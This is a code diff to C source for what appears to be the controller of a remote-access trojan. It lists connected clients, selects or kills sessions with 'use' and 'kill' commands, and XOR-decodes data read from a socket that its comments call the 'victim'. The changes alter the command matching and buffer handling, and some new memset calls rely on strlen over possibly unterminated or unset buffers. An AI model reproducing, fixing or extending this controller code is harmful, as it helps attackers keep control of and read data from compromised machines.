@@ -31,7 +31,7 @@ int server_control_session(){
                 printf("%d           %s\n", i + 1, get_socket_addr(client_socket[i]));
             }
 	    printf("\n");
-        } else if (str_starts_with(buffer, "use") == 1) {
+        } else if (str_starts_with(buffer, "use") == 0) {
             selected_id = 0;
 
             for (int c = 4; c < strlen(buffer); c++){
@@ -48,7 +48,7 @@ int server_control_session(){
                 selected_id += 3;
                 return selected_id;
             }
-        } else if (str_starts_with(buffer, "kill") == 1){
+        } else if (str_starts_with(buffer, "kill") == 0){
 		
 		selected_id = 0;
 
@@ -94,13 +94,14 @@ void *Socket_Reader(){
     // Intercept incoming data from the current victim socket
     char buffer[MAXBUF];
     int n;
-    read(a.dest, buffer, 18);
-    char* xorhello = XOR(buffer, key, 18, keylen);
-    write(STDOUT_FILENO, xorhello, 18);
+    char* xorbuffer;
+    n = read(a.dest, buffer, MAXBUF);
+    char* xorhello = XOR(buffer, key, n, keylen);
+    write(STDOUT_FILENO, xorhello, n);
 
     fflush(NULL);
     while (a.kill == 0 && (n = read(a.dest, buffer, MAXBUF)) > 0) {
-	char* xorbuffer = XOR(buffer, key, n, keylen);
+	xorbuffer = XOR(buffer, key, n, keylen);
         if (write(STDOUT_FILENO, xorbuffer, n) < 0)  // writes data from victim fd to stdout
             printf("Error in function write()\n");
         fflush(NULL);
@@ -112,6 +113,8 @@ void *Socket_Reader(){
         printf("Error in function read()\n");
 
     a.kill = 1;
+    memset(xorbuffer, '\0', strlen(xorbuffer));
+    memset(buffer, '\0', strlen(buffer));    
     return NULL;
 }
 
